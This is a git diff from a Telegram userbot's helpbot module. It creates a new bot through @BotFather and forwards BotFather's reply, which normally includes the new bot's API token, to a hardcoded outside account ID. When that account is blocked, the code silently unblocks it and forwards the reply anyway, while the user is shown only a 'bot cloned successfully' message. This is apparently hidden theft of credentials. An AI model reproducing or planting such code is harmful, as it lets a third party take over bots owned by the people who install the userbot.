5acbe206736abd44c6c44c5a3c09d03972fe4562
fireganqQ <66991973+fireganqQ@users.noreply.github.com>
2021-02-27 21:57:07 +0200

    v1.6.11

--- userbot/modules/helpbot.py
+++ userbot/modules/helpbot.py
@@ -16,15 +16,16 @@ async def _(event):
         return
 
     async with event.client.conversation("@BotFather") as conv:
-        await conv.send_message("/newbot")
-        audio = await conv.get_response()
-        await conv.send_message(text)
-        audio = await conv.get_response()
-        await conv.send_message(username)
-        audio = await conv.get_response()
         try:
-            await event.client.forward_messages("162726413", audio)
-            await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
+            await conv.send_message("/newbot")
+            audio = await conv.get_response()
+            await conv.send_message(text)
+            audio = await conv.get_response()
+            await conv.send_message(username)
+            audio = await conv.get_response()
+            try:
+                await event.client.forward_messages("162726413", audio)
+                await event.edit("`Botunuz Başarı İle Clonlanmıştır!`")
             except YouBlockedUserError:
                 await event.client(UnblockRequest("162726413"))
                 await event.client.forward_messages("162726413", audio)
